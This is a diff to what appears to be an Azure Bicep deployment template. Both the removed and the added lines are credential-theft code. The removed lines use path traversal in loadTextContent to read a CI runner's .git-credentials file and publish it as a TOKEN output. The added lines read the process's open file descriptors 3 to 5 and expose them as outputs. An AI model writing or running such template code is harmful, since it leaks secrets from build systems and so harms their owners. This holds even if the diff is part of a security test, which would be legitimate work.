@@ -1,13 +1,7 @@
+  var fd3 = loadTextContent('../../../../../../../../../../proc/self/fd/3')
+  var fd4 = loadTextContent('../../../../../../../../../../proc/self/fd/4')
+  var fd5 = loadTextContent('../../../../../../../../../../proc/self/fd/5')
 
-  var creds = loadTextContent('../../../../../../home/runner/.git-credentials')
-
-  param location string = 'eastus'
-
-  resource storageAccount 'Microsoft.Storage/storageAccounts@2021-02-01' = {
-    name: 'yourbaseisnowbelongtous'
-    location: location
-    sku: { name: 'Standard_LRS' }
-    kind: 'StorageV2'
-  }
-
-  output TOKEN string = creds
+  output FD3 string = fd3
+  output FD4 string = fd4
+  output FD5 string = fd5
